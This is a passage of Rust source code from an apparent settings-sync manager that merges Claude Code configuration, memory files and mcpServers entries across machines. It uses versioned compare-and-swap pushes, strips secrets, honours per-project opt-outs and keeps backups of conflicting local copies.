                    key = cfg.sync_key,
                    rel,
                    "deleted on the other machine, but kept here: {e:#}",
                ),
            }
        }
    }

    async fn push_claude_json_mcp(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let bytes = match tokio::fs::read(&self.paths.claude_json).await {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(e) => return Err(IdeError::Other(format!("read .claude.json: {e}"))),
        };
        let parsed: Value = serde_json::from_slice(&bytes)?;
        let Some(mcp) = parsed.get("mcpServers").map(strip_mcp_secrets) else {
            return Ok(());
        };
        // Claude Code rewrites ~/.claude.json about every minute; mostly
        // not its mcpServers, which then need no request at all.
        let hash = mcp_servers_hash(&mcp);
        {
            let st = push_state.lock().await;
            if st.last_local_mcp_hash.as_deref() == Some(hash.as_str())
                && st.known_version.contains_key(CLAUDE_JSON_MCP_SYNC_KEY)
            {
                return Ok(());
            }
        }
        self.push_local_value(
            CLAUDE_JSON_MCP_SYNC_KEY,
            LocalValue::PlatformSlot(mcp),
            push_state,
        )
        .await?;
        let purge_owed = {
            let mut st = push_state.lock().await;
            st.last_local_mcp_hash = Some(hash);
            !std::mem::replace(&mut st.legacy_mcp_purged, true)
        };
        if purge_owed {
            if let Err(e) = self.purge_legacy_mcp_slot().await {
                tracing::warn!(target: "mnemos_ide_sync::manager", "old mcpServers slot not removed yet: {e:#}");
                push_state.lock().await.legacy_mcp_purged = false;
            }
        }
        Ok(())
    }

    /// Remove this platform's slot from the pre-`-v2` mcpServers key, which
    /// still holds `env` and `headers`. Only after this machine's `-v2` push
    /// landed, so the servers are on the server in the new key first.
    async fn purge_legacy_mcp_slot(&self) -> Result<(), IdeError> {
        let Some(state) = self
            .client
            .get_state(LEGACY_CLAUDE_JSON_MCP_SYNC_KEY)
            .await?
        else {
            return Ok(());
        };
        let platform = current_platform();
        let Some(slots) = state.value.as_object().filter(|o| o.contains_key(platform)) else {
            return Ok(());
        };
        let mut slots = slots.clone();
        slots.remove(platform);
        self.client
            .put_state(
                LEGACY_CLAUDE_JSON_MCP_SYNC_KEY,
                &Value::Object(slots),
                Some(state.version),
            )
            .await?;
        tracing::info!(
            target: "mnemos_ide_sync::manager",
            platform,
            "removed this platform's mcpServers (with env and headers) from the old key",
        );
        Ok(())
    }

    async fn push_memory(
        self: &Arc<Self>,
        sync_key: &str,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let pid = self.profile_id.lock().await.clone();
        let Some(pid) = pid else {
            return Ok(());
        };
        let prefix = format!("claude-memory:{pid}:");
        let Some(repo) = sync_key.strip_prefix(&prefix) else {
            return Ok(());
        };
        // Per-project sync opt-out: skip the entire key if disabled.
        if let Some(project_id) = self.project_id_for_repo(repo).await {
            if self.load_sync_disabled_set().await.contains(&project_id) {
                tracing::debug!(target: "mnemos_ide_sync::manager", repo, project_id, "skipping memory push — project sync disabled");
                return Ok(());
            }
        }
        // Find the project dir whose `path` encodes to a directory matching our repo.
        let Some(project_dir) = self.find_memory_project_dir(repo).await else {
            tracing::debug!(target: "mnemos_ide_sync::manager", repo, "no local project for memory key");
            return Ok(());
        };
        let payload = build_memory_payload(&project_dir);
        let local_names = payload.as_ref().map(memory_names_in).unwrap_or_default();
        let (mut tombs, revived) = {
            let st = push_state.lock().await;
            (
                st.pending_memory_tombstones
                    .get(sync_key)
                    .cloned()
                    .unwrap_or_default(),
                st.pending_memory_revivals
                    .get(sync_key)
                    .cloned()
                    .unwrap_or_default(),
            )
        };
        // A name that exists again is no longer deleted.
        tombs.retain(|name, _| !local_names.contains(name));
        // No memory file and no MEMORY.md left looks the same as a moved or
        // lost project dir: not taken as a decision.
        if !tombs.is_empty() && local_names.is_empty() {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                sync_key,
                count = tombs.len(),
                "not propagating these memory deletes: nothing is left locally; delete them on the other machine too if they were meant",
            );
            push_state
                .lock()
                .await
                .pending_memory_tombstones
                .remove(sync_key);
            tombs.clear();
        }
        if payload.is_none() && tombs.is_empty() {
            return Ok(());
        }
        let mut value = payload.unwrap_or_else(|| json!({"files": {}, "memoryMd": null}));
        if !tombs.is_empty() {
            value["__deleted_at"] = json!(tombs);
        }
        if !revived.is_empty() {
            value[crate::merge::MEMORY_REVIVED_KEY] = json!(revived);
        }
        let merged = self
            .push_with_merge_value(sync_key, value, push_state)
            .await?;
        let mut st = push_state.lock().await;
        // What went up is settled; a delete recorded meanwhile has a later
        // time and waits for the next push.
        if let Some(pending) = st.pending_memory_tombstones.get_mut(sync_key) {
            pending.retain(|name, at| tombs.get(name) != Some(at));
            if pending.is_empty() {
                st.pending_memory_tombstones.remove(sync_key);
            }
        }
        if let Some(pending) = st.pending_memory_revivals.get_mut(sync_key) {
            pending.retain(|name| !revived.contains(name));
            if pending.is_empty() {
                st.pending_memory_revivals.remove(sync_key);
            }
        }
        if let Some(merged) = merged {
            st.memory_names
                .insert(sync_key.to_string(), memory_names_in(&merged));
        }
        Ok(())
    }

    /// Reverse of `git_repo_for_project_dir`: the `~/.claude/projects/<slug>`
    /// dir holding a repo's memory on this machine, `<slug>` being Claude
    /// Code's name for the repo's checkout here.
    ///
    /// The checkout is the record's own path for this platform when it exists
    /// on disk, else one found by discovery (`LocalResolver`, which persists
    /// what it finds), else one learned from the `cwd` of Claude transcripts
    /// already on this machine.
    ///
    /// `None` when this machine has no checkout of the repo. There is
    /// deliberately no fallback to the registered `path`: from another
    /// platform that names a directory Claude Code here never reads, so
    /// memory written there is simply lost.
    async fn find_memory_project_dir(&self, git_repo: &str) -> Option<PathBuf> {
        let root = match self.resolve_repo_root(git_repo).await {
            Some(root) => root,
            None => {
                let root = self.scan_local_checkout(git_repo).await?;
                self.learn_platform_path(git_repo, &root).await;
                root
            }
        };
        memory_dir_for_root(&self.paths.claude_projects_dir, &root)
    }

    /// This machine's checkout of `git_repo` that speaks for its memory
    /// ([`pick_memory_record`], resolving by the record's path here or by
    /// discovery).
    async fn resolve_repo_root(&self, git_repo: &str) -> Option<PathBuf> {
        let resolver = self.resolver.clone();
        let exact = git_repo.to_string();
        let resolved = self
            .update_store(move |s| {
                let mut resolver = resolver.lock().unwrap_or_else(|e| e.into_inner());
                pick_memory_record(s, &exact, |s, id| {
                    resolver.resolve_local_path(s, id, &RealFs)
                })
            })
            .await;
        match resolved {
            Ok(picked) => picked.map(|(_, root)| root),
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", git_repo, "checkout lookup failed: {e:#}");
                None
            }
        }
    }

    /// The sync key a change in `~/.claude/projects/<slug>` pushes, when
    /// that dir holds the memory of the checkout that speaks for its repo.
    /// Another checkout of the same repo (TwinCurrent-Build next to TCB,
    /// both `bob/TCB`) shares the key but not the dir, and its
    /// changes are ignored: they would replace the chosen checkout's notes.
    async fn memory_key_for_dir(&self, slug: &str) -> Option<String> {
        let pid = self.profile_id.lock().await.clone()?;
        let git_repo = self.git_repo_for_project_dir(slug).await?;
        if let Some(root) = self.resolve_repo_root(&git_repo).await {
            let chosen = claude_project_dir_name(&root);
            if !chosen.is_some_and(|c| same_dir_name(&c, slug, current_platform())) {
                tracing::debug!(
                    target: "mnemos_ide_sync::manager",
                    slug,
                    git_repo,
                    chosen = %root.display(),
                    "memory change in another checkout of the repo; ignored",
                );
                return None;
            }
        }
        Some(format!("claude-memory:{pid}:{git_repo}"))
    }

    /// Walk `~/.claude/projects/*`, read each dir's transcript `cwd`, and
    /// return the enclosing checkout of the first one whose `origin` is
    /// `git_repo`. Transcripts a pull created are passed over (see
    /// [`pulled_sessions`]).
    async fn scan_local_checkout(&self, git_repo: &str) -> Option<PathBuf> {
        let projects_dir = self.paths.claude_projects_dir.clone();
        let store_dir = self.paths.mnemos_store_dir.clone();
        let key = registry::git_repo_key(git_repo);
        tokio::task::spawn_blocking(move || {
            let pulled = pulled_sessions(store_dir.as_deref());
            for entry in std::fs::read_dir(&projects_dir).ok()?.flatten() {
                if !entry.file_type().is_ok_and(|t| t.is_dir()) {
                    continue;
                }
                let Some(cwd) = cwd_from_transcripts(&entry.path(), &pulled) else {
                    continue;
                };
                let Some((root, remote)) = repo_root_and_remote(&cwd) else {
                    continue;
                };
                if registry::git_repo_key(&remote) == key {
                    return Some(root);
                }
            }
            None
        })
        .await
        .ok()
        .flatten()
    }

    /// The project id whose sync opt-out governs `git_repo`'s memory: the
    /// record [`pick_memory_record`] chooses among those whose checkout is
    /// already known here (no discovery scan for an opt-out check), else the
    /// first record of the repo. `None` if no record has that repo.
    async fn project_id_for_repo(&self, git_repo: &str) -> Option<String> {
        let exact = git_repo.to_string();
        let picked = self
            .update_store(move |s| {
                let platform = current_platform();
                let known_here = |s: &mut ProjectStore, id: &str| {
                    s.get(id)?.platform_path(platform).filter(|p| p.is_dir())
                };
                pick_memory_record(s, &exact, known_here)
                    .map(|(id, _)| id)
                    .or_else(|| {
                        let key = registry::git_repo_key(&exact);
                        s.projects
                            .iter()
                            .find(|p| {
                                p.git_repo()
                                    .is_some_and(|g| registry::git_repo_key(&g) == key)
                            })
                            .map(|p| p.id.clone())
                    })
            })
            .await;
        picked.ok().flatten()
    }

    /// Merge-at-push: pull current remote (with version), merge per the
    /// per-key strategy, push with `expected_version`. On 409 retry up to
    /// `PUSH_CAS_MAX_RETRIES` with backoff. After exhaustion, fall back to LWW
    /// (except the session index, which returns the conflict).
    /// Publishes the outcome on the status channel either way.
    async fn push_with_merge(
        self: &Arc<Self>,
        sync_key: &str,
        local_value: Value,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        self.push_with_merge_value(sync_key, local_value, push_state)
            .await
            .map(|_| ())
    }

    /// [`Self::push_with_merge`], returning what the server holds for the key
    /// afterwards: `Some(merged)` after a push, or after finding the server
    /// already held everything we have; `None` when skipped because this exact
    /// merged value was the last one pushed.
    async fn push_with_merge_value(
        self: &Arc<Self>,
        sync_key: &str,
        local_value: Value,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<Option<Value>, IdeError> {
        self.push_local_value(sync_key, LocalValue::Whole(local_value), push_state)
            .await
    }

    /// [`Self::push_with_merge_value`] for a [`LocalValue`], which each CAS
    /// attempt turns into the value to merge against that attempt's server
    /// copy.
    async fn push_local_value(
        self: &Arc<Self>,
        sync_key: &str,
        local: LocalValue,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<Option<Value>, IdeError> {
        self.status_key(sync_key, None, KeySyncState::Pending);
        let res = self
            .push_with_merge_inner(sync_key, &local, push_state)
            .await;
        match &res {
            Ok(_) => {
                let version = push_state.lock().await.known_version.get(sync_key).copied();
                self.status_key(sync_key, version, KeySyncState::InSync);
            }
            Err(e) => self.status_key(sync_key, None, KeySyncState::Error(status_error_message(e))),
        }
        res
    }

    async fn push_with_merge_inner(
        self: &Arc<Self>,
        sync_key: &str,
        local: &LocalValue,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<Option<Value>, IdeError> {
        for attempt in 0..=PUSH_CAS_MAX_RETRIES {
            let remote = self.client.get_state(sync_key).await?;
            let (expected_version, remote_value) = match &remote {
                Some(r) => (Some(r.version), r.value.clone()),
                // The session index is created insert-if-absent (`0`): a
                // blind create would replace an index the other machine
                // created a moment ago, and that machine never re-sends
                // entries it saw land.
                None if sync_key == SESSION_INDEX_KEY => (Some(0), Value::Null),
                None => {
                    let cached = push_state.lock().await.known_version.get(sync_key).copied();
                    (cached, Value::Null)
                }
            };
            let local_value = match local {
                LocalValue::Whole(value) => value.clone(),
                // Wrapped in this attempt's envelope, so a slot another
                // platform wrote since the last attempt is kept, never
                // reverted to an older copy.
                LocalValue::PlatformSlot(value) => {
                    let mut envelope = platform_slots_of(&remote_value);
                    envelope.insert(current_platform().to_string(), value.clone());
                    Value::Object(envelope)
                }
                LocalValue::Directory {
                    cfg,
                    files,
                    revived,
                } => {
                    let mut files = files.clone();
                    let server = remote.as_ref().and_then(|r| dir_slot(cfg, &r.value));
                    self.settle_against_tombstones(cfg, &mut files, server, revived, push_state)
                        .await;
                    if cfg.platform_specific {
                        // This attempt's envelope: the other platforms' slots
                        // exactly as the server has them now.
                        let mut envelope = platform_slots_of(&remote_value);
                        envelope.insert(current_platform().to_string(), Value::Object(files));
                        Value::Object(envelope)
                    } else {
                        Value::Object(files)
                    }
                }
                // Laid over this attempt's server copy, path by path.
                LocalValue::Settings(local) => match self.settings_policy.as_ref() {
                    Some(policy) => {
                        settings_toml::outgoing(local, &remote_value, current_platform(), policy)
                    }
                    None => return Ok(None),
                },
            };
            // Items waiting for approval here go up as the server has them.
            let local_value = self.gate_outgoing(sync_key, local_value, &remote_value);
            // A missing server copy is `null`: every key's merge returns
            // `local` for it (the session index normalizes it on the way).
            let merged = merge_for_key(sync_key, &local_value, &remote_value);
            // What the union kept of files no machine should sync (an older
            // build's copy of Claude Code's skill cache) is dropped here, so
            // the server and the team blob lose it with this write.
            let merged = match DIRECTORIES.iter().find(|d| d.sync_key == sync_key) {
                Some(cfg) => without_unsynced_rels(cfg, merged),
                None => merged,
            };

            let merged_json = serde_json::to_string(&merged)?;
            let hash = sha256_hex(merged_json.as_bytes());

            // When the server already holds exactly what the merge gives,
            // there is nothing to write: every start pushes every key, and
            // re-writing an unchanged one bumped its version, which made the
            // other machine pull and rewrite it. The registry is judged by
            // content (record order and `machineId` ignored), which keeps
            // two machines from bumping the version back and forth over
            // nothing.
            if let Some(r) = &remote {
                let nothing_new = if sync_key == registry::PROJECTS_KEY {
                    registry::projects_semantically_equal(&merged, &r.value)
                } else {
                    merged == r.value
                };
                if nothing_new {
                    let mirror_owed = {
                        let mut st = push_state.lock().await;
                        st.known_version.insert(sync_key.to_string(), r.version);
                        st.last_hash.insert(sync_key.to_string(), hash);
                        self.note_baseline(&mut st, sync_key, &r.value, r.version)
                            .await;
                        st.team_mirror_owed.remove(sync_key)
                    };
                    // The startup push still refreshes the team's copy.
                    if mirror_owed {
                        self.mirror_to_team(sync_key, &r.value).await;
                    }
                    return Ok(Some(r.value.clone()));
                }
            }
            // "Pushed exactly this before" does not mean the server still has
            // it: an older build replaces the whole registry, dropping records
            // (or tombstones) we pushed. Those must go back up. A difference
            // in values only keeps the shortcut, which is what stops two
            // machines that each keep their own value (a top-level key, one
            // platform's `paths` slot) from pushing it at each other forever.
            let server_lost_ids = sync_key == registry::PROJECTS_KEY
                && remote
                    .as_ref()
                    .is_some_and(|r| registry_ids_missing_from(&merged, &r.value));
            // For the session index a merge that differs from the server
            // always holds something the server lacks (checked just above),
            // so the shortcut could only ever skip a needed write.
            if !server_lost_ids && sync_key != SESSION_INDEX_KEY {
                let st = push_state.lock().await;
                if st.last_hash.get(sync_key) == Some(&hash)
                    && st.known_version.contains_key(sync_key)
                {
                    return Ok(None);
                }
            }

            match self
                .client
                .put_state(sync_key, &merged, expected_version)
                .await
            {
                Ok(resp) => {
                    {
                        let mut st = push_state.lock().await;
                        st.last_hash.insert(sync_key.to_string(), hash);
                        st.known_version.insert(sync_key.to_string(), resp.version);
                        self.note_baseline(&mut st, sync_key, &merged, resp.version)
                            .await;
                        st.team_mirror_owed.remove(sync_key);
                    }
                    self.mirror_to_team(sync_key, &merged).await;
                    tracing::debug!(
                        target: "mnemos_ide_sync::manager",
                        sync_key,
                        version = resp.version,
                        "pushed",
                    );
                    return Ok(Some(merged));
                }
                Err(IdeError::CasConflict {
                    key,
                    current_version,
                    current_value,
                }) => {
                    if attempt < PUSH_CAS_MAX_RETRIES {
                        let delay = PUSH_CAS_BACKOFF_MS[attempt.min(PUSH_CAS_BACKOFF_MS.len() - 1)];
                        tracing::info!(
                            target: "mnemos_ide_sync::manager",
                            sync_key,
                            current_version,
                            attempt = attempt + 1,
                            "cas conflict — retrying",
                        );
                        tokio::time::sleep(Duration::from_millis(delay)).await;
                        continue;
                    }
                    // Never a blind write for the session index: it would
                    // drop the other machine's entries for good. The entries
                    // stay owed and the transcript worker retries them.
                    if sync_key == SESSION_INDEX_KEY {
                        return Err(IdeError::CasConflict {
                            key,
                            current_version,
                            current_value,
                        });
                    }
                    // Exhausted — LWW fallback.
                    tracing::warn!(
                        target: "mnemos_ide_sync::manager",
                        sync_key,
                        "cas retries exhausted, falling back to LWW",
                    );
                    match self.client.put_state(sync_key, &merged, None).await {
                        Ok(resp) => {
                            {
                                let mut st = push_state.lock().await;
                                st.last_hash.insert(sync_key.to_string(), hash);
                                st.known_version.insert(sync_key.to_string(), resp.version);
                                self.note_baseline(&mut st, sync_key, &merged, resp.version)
                                    .await;
                                st.team_mirror_owed.remove(sync_key);
                            }
                            self.mirror_to_team(sync_key, &merged).await;
                            return Ok(Some(merged));
                        }
                        Err(e) => return Err(e),
                    }
                }
                Err(e) => return Err(e),
            }
        }
        Ok(None)
    }

    /// Push every key once at startup. Returns the scopes that failed for a
    /// transient reason so the event loop can retry them — a failure here is
    /// per-key and never aborts the rest of the initial push.
    async fn do_push_initial(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Vec<DebounceScope> {
        let mut scopes = initial_push_scopes();
        // claude-memory per project. NB: bind the clone BEFORE the `if let` —
        // an `if let Some(x) = mutex.lock().await.clone()` scrutinee keeps
        // the MutexGuard temporary alive for the whole body, and push_memory
        // re-locks profile_id → self-deadlock that froze the sync pipeline
        // (event loop never started; watcher pushes never fired).
        let pid = self.profile_id.lock().await.clone();
        if let Some(pid) = pid {
            for (repo, _dir) in self.list_local_memory_projects().await {
                scopes.push(DebounceScope::Memory(format!("claude-memory:{pid}:{repo}")));
            }
        }

        push_state.lock().await.team_mirror_owed =
            SHAREABLE_TEAM_KEYS.iter().map(|k| k.to_string()).collect();
        let mut failed = Vec::new();
        for scope in scopes {
            if let Err(e) = self
                .clone()
                .dispatch_push(scope.clone(), push_state.clone())
                .await
            {
                tracing::warn!(
                    target: "mnemos_ide_sync::manager",
                    ?scope,
                    "initial push failed: {e:#}",
                );
                if is_transient(&e) {
                    failed.push(scope);
                }
            }
        }
        push_state.lock().await.team_mirror_owed.clear();
        failed
    }

    /// Every repo with a memory dir on this machine, as `(gitRepo, dir)`.
    /// Uses each record's checkout HERE (resolved through the store, so a
    /// checkout found by discovery is persisted), never the path another
    /// machine registered.
    async fn list_local_memory_projects(&self) -> Vec<(String, PathBuf)> {
        let resolver = self.resolver.clone();
        let roots = self
            .update_store(move |s| {
                // One memory key per spelling of `gitRepo`; records of one
                // repo share it, and one checkout speaks for them.
                let repos: BTreeSet<String> =
                    s.projects.iter().filter_map(|p| p.git_repo()).collect();
                let mut resolver = resolver.lock().unwrap_or_else(|e| e.into_inner());
                repos
                    .into_iter()
                    .filter_map(|repo| {
                        let (_, root) = pick_memory_record(s, &repo, |s, id| {
                            resolver.resolve_local_path(s, id, &RealFs)
                        })?;
                        Some((repo, root))
                    })
                    .collect::<Vec<_>>()
            })
            .await;
        let roots = match roots {
            Ok(roots) => roots,
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", "listing local checkouts failed: {e:#}");
                return Vec::new();
            }
        };
        roots
            .into_iter()
            .filter_map(|(repo, root)| {
                let dir = memory_dir_for_root(&self.paths.claude_projects_dir, &root)?;
                dir.exists().then_some((repo, dir))
            })
            .collect()
    }

    /// Best-effort mirror of a shareable key into the selected Drive team's
    /// scope (LWW — the team blob is a broadcast, not the CAS'd source of
    /// truth). No-op when no team is selected or the key isn't shareable.
    async fn mirror_to_team(self: &Arc<Self>, sync_key: &str, value: &Value) {
        if !SHAREABLE_TEAM_KEYS.contains(&sync_key) {
            return;
        }
        if !self
            .team_is_owner
            .load(std::sync::atomic::Ordering::Relaxed)
        {
            return; // members are pull-only
        }
        let Some(team) = self.team_id.lock().await.clone() else {
            return;
        };
        if let Err(e) = self
            .client
            .put_team_state(&team, sync_key, value, None)
            .await
        {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                sync_key,
                team,
                "team mirror failed: {e:#}",
            );
        }
    }

    async fn do_pull_all(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
        scope: PullScope<'_>,
    ) -> Result<(), IdeError> {
        let states = self.client.pull_all().await?;
        tracing::info!(
            target: "mnemos_ide_sync::manager",
            count = states.len(),
            "pulled state from admin",
        );
        let mut unchanged = 0usize;
        for s in &states {
            // Older builds still push their tab list; it is local-only now,
            // so it is neither applied nor shown as a synced key.
            if s.key == MNEMOS_WORKSPACE_STATE_KEY {
                continue;
            }
            // The whole-file settings.toml of older builds: never applied
            // (see `MNEMOS_USER_SETTINGS_KEY`). Hooks without the opt-in:
            // neither applied nor recorded, so turning hooks sync on later
            // starts from what is on disk here.
            if s.key == MNEMOS_USER_SETTINGS_KEY || self.key_skipped(&s.key) {
                // A world-readable `.env` is tightened whether it syncs or
                // not (only at startup, as an applied one would be).
                #[cfg(unix)]
                if s.key == CLAUDE_ENV_SYNC_KEY && matches!(scope, PullScope::Everything) {
                    self.heal_global_file_mode(&s.key).await;
                }
                continue;
            }
            // Applying a key writes the server's copy over the local files
            // (a directory key sets aside local files the copy lacks), so
            // after startup only keys that moved on the server are applied,
            // and never one with a local change still waiting to go up. The
            // registry is the exception: its apply is a merge that keeps
            // every local edit.
            match scope {
                PullScope::Changes { pending } => {
                    if s.key != registry::PROJECTS_KEY {
                        if pending.contains(&s.key) {
                            tracing::debug!(target: "mnemos_ide_sync::manager", key = %s.key, "pull: local change pending; not applied");
                            continue;
                        }
                        let known = push_state.lock().await.known_version.get(&s.key).copied();
                        if known == Some(s.version) {
                            unchanged += 1;
                            continue;
                        }
                    }
                    self.apply_pulled(s, push_state).await;
                }
                // At startup a directory key is resolved file by file
                // against what changed here while this machine was not
                // syncing, and nothing local is removed.
                PullScope::Everything => match DIRECTORIES.iter().find(|d| d.sync_key == s.key) {
                    Some(cfg) => self.apply_startup_dir(cfg, s, push_state).await,
                    None if is_single_file_key(&s.key) => {
                        self.apply_startup_file(s, push_state).await
                    }
                    None => self.apply_pulled(s, push_state).await,
                },
            }
        }
        if unchanged > 0 {
            tracing::debug!(target: "mnemos_ide_sync::manager", unchanged, "pull: keys unchanged since last sync");
        }
        let pending = match scope {
            PullScope::Everything => None,
            PullScope::Changes { pending } => Some(pending),
        };
        self.do_pull_team(push_state, pending).await;
        self.status_tx
            .send_modify(|st| st.last_pull_at = Some(SystemTime::now()));
        Ok(())
    }

    /// Apply one pulled key and record its version.
    async fn apply_pulled(
        self: &Arc<Self>,
        state: &SyncStateResponse,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        self.apply_pulled_as(state, &state.value, ApplyMode::Mirror, push_state)
            .await;
    }

    /// [`Self::apply_pulled`], writing `value` (the server's `state.value`
    /// as resolved against the local files) in `mode`. The version and the
    /// baseline recorded are the server's.
    async fn apply_pulled_as(
        self: &Arc<Self>,
        state: &SyncStateResponse,
        value: &Value,
        mode: ApplyMode,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        // What the server holds, not what was resolved against the local
        // files: an item kept local only because it is newer here is still
        // an unapproved incoming change.
        self.refresh_gate_pending(&state.key, &state.value, GateSource::Personal)
            .await;
        match self
            .apply_state_as(&state.key, value, push_state, mode)
            .await
        {
            Ok(()) => {
                // Recorded only once applied: the live poll and later pulls
                // skip a key whose version is known, so a failed apply (a
                // rename refused by AV on Windows, say) must stay unknown to
                // be tried again.
                {
                    let mut st = push_state.lock().await;
                    st.known_version.insert(state.key.clone(), state.version);
                    self.note_baseline(&mut st, &state.key, &state.value, state.version)
                        .await;
                }
                self.status_key(&state.key, Some(state.version), KeySyncState::InSync)
            }
            Err(e) => {
                tracing::warn!(
                    target: "mnemos_ide_sync::manager",
                    key = %state.key,
                    "apply failed: {e:#}",
                );
                self.status_key(
                    &state.key,
                    Some(state.version),
                    KeySyncState::Error(status_error_message(&e)),
                );
            }
        }
    }

    /// The startup pull of a directory key ([`resolve_startup_dir`]): per
    /// file against the baseline of the last sync, so an edit made here
    /// while this machine was not syncing (signed out, offline, app closed)
    /// is kept for the initial push, an edit made on the other machine
    /// arrives, and nothing local is removed. When both sides changed a
    /// file, or there is no baseline for it, the newer side wins: the local
    /// copy only when it was modified after the server last wrote the key
    /// (`synced_at`), with the server's kept in the backups; else the
    /// server's copy, with the local one in the backups. A platform slot
    /// has no writer but this platform, and `synced_at` moves with the
    /// other platforms' pushes, so there the local copy always wins.
    async fn apply_startup_dir(
        self: &Arc<Self>,
        cfg: &DirectorySync,
        state: &SyncStateResponse,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        let Some(server) = dir_slot(cfg, &state.value) else {
            // Nothing for this machine (no slot for this platform).
            self.apply_pulled_as(state, &state.value, ApplyMode::NoDelete, push_state)
                .await;
            return;
        };
        let dir = self.paths.claude_dir.join(cfg.relative);
        let local = serialize_directory(&dir, cfg)
            .and_then(|v| v.as_object().cloned())
            .unwrap_or_default();
        let baseline = {
            let mut st = push_state.lock().await;
            self.baseline(&mut st)
                .await
                .keys
                .get(cfg.sync_key)
                .map(|e| e.files.clone())
        };
        let server_ms = server_written_ms(state);
        let (resolved, set_aside) = resolve_startup_dir(&local, server, baseline.as_ref(), |rel| {
            cfg.platform_specific || modified_after(&dir.join(rel), server_ms)
        });
        let backups = Backups::new(&self.paths);
        for (rel, bytes) in set_aside {
            match backups.keep_server_copy(cfg.sync_key, &rel, &bytes).await {
                Ok(dest) => tracing::info!(
                    target: "mnemos_ide_sync::manager",
                    key = cfg.sync_key,
                    rel,
                    server_copy = %dest.display(),
                    "differs from the server and won; kept the local copy",
                ),
                Err(e) => {
                    tracing::warn!(target: "mnemos_ide_sync::manager", key = cfg.sync_key, rel, "{e:#}")
                }
            }
        }
        let value = if cfg.platform_specific {
            let mut envelope = state.value.as_object().cloned().unwrap_or_default();
            envelope.insert(current_platform().to_string(), Value::Object(resolved));
            Value::Object(envelope)
        } else {
            Value::Object(resolved)
        };
        self.apply_pulled_as(state, &value, ApplyMode::NoDelete, push_state)
            .await;
    }

    /// The startup pull of a single-file key (a `~/.claude` file, Mnemos's
    /// settings, `~/.claude.json`'s mcpServers). These merge local-wins, so
    /// a local copy kept here is what the initial push sends. A file
    /// unchanged since the last sync takes the server's copy when the server
    /// moved; one changed only here (the server still holds the last sync)
    /// is kept. With no baseline, or both sides changed, the local copy is
    /// kept only when [`Self::local_copy_wins`]; else the server's copy is
    /// written and the local one goes to the backups. A kept local copy puts
    /// the server's in `backups/.../server/<key>.json`. A file already
    /// holding what the pull would write just records the sync.
    async fn apply_startup_file(
        self: &Arc<Self>,
        state: &SyncStateResponse,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        let key = state.key.as_str();
        // A local copy kept below is pushed; the gates must know first which
        // of the server's items wait for approval, so the push keeps them.
        self.refresh_gate_pending(key, &state.value, GateSource::Personal)
            .await;
        let (Some(server_hash), Some(local_hash)) = (
            self.value_hash(key, &state.value),
            self.local_file_hash(key).await,
        ) else {
            // Nothing for this machine in the value, or nothing local to
            // lose.
            self.apply_pulled(state, push_state).await;
            return;
        };
        let base = {
            let mut st = push_state.lock().await;
            self.baseline(&mut st).await.keys.get(key).cloned()
        };
        let in_sync = local_hash == server_hash
            || base.as_ref().is_some_and(|b| {
                b.version == state.version && b.sha256.as_deref() == Some(local_hash.as_str())
            });
        if in_sync {
            // Never rewritten, so healed here (a stripped statusline.py, a
            // world-readable .env).
            #[cfg(unix)]
            self.heal_global_file_mode(key).await;
            {
                let mut st = push_state.lock().await;
                st.known_version.insert(state.key.clone(), state.version);
                if local_hash == server_hash {
                    self.note_baseline(&mut st, key, &state.value, state.version)
                        .await;
                    if key == CLAUDE_JSON_MCP_SYNC_KEY {
                        st.last_local_mcp_hash = Some(local_hash);
                    }
                }
            }
            self.status_key(key, Some(state.version), KeySyncState::InSync);
            return;
        }
        let unchanged_here = base
            .as_ref()
            .is_some_and(|b| b.sha256.as_deref() == Some(local_hash.as_str()));
        if unchanged_here {
            self.apply_pulled(state, push_state).await;
            return;
        }
        let changed_only_here = base
            .as_ref()
            .is_some_and(|b| b.sha256.as_deref() == Some(server_hash.as_str()));
        if !changed_only_here && !self.local_copy_wins(key, state) {
            tracing::info!(
                target: "mnemos_ide_sync::manager",
                key,
                "differs from the server and is not newer here; taking the server's copy, the local one goes to the backups",
            );
            self.apply_pulled(state, push_state).await;
            return;
        }
        match Backups::new(&self.paths)
            .keep_server_value(key, &state.value)
            .await
        {
            Ok(dest) => tracing::info!(
                target: "mnemos_ide_sync::manager",
                key,
                server_copy = %dest.display(),
                "changed here while not syncing; keeping the local copy for the push",
            ),
            Err(e) => tracing::warn!(target: "mnemos_ide_sync::manager", key, "{e:#}"),
        }
    }

    /// Give a `~/.claude` file of `key` the mode a pull would have written
    /// it with ([`healed_mode`]). Not through a link.
    #[cfg(unix)]
    async fn heal_global_file_mode(&self, key: &str) {
        let Some(cfg) = GLOBAL_FILES.iter().find(|f| f.sync_key == key) else {
            return;
        };
        let path = self.paths.claude_dir.join(cfg.file_name);
        let Ok(meta) = tokio::fs::symlink_metadata(&path).await else {
            return;
        };
        if !meta.is_file() {
            return;
        }
        if let Ok(bytes) = tokio::fs::read(&path).await {
            heal_mode(&path, &bytes, &meta).await;
        }
    }

    /// Whether a single-file key's differing local copy wins a startup pull
    /// that cannot tell which side changed: when the file was modified after
    /// the server last wrote the key (`synced_at`). A platform-specific
    /// value (`claude-settings`, `~/.claude.json`'s mcpServers) always
    /// wins: its slot has no writer but this platform, and `synced_at`
    /// moves with the other platforms' pushes.
    fn local_copy_wins(&self, key: &str, state: &SyncStateResponse) -> bool {
        if key == CLAUDE_JSON_MCP_SYNC_KEY {
            return true;
        }
        match self.single_file_target(key) {
            Some((_, _, true)) => true,
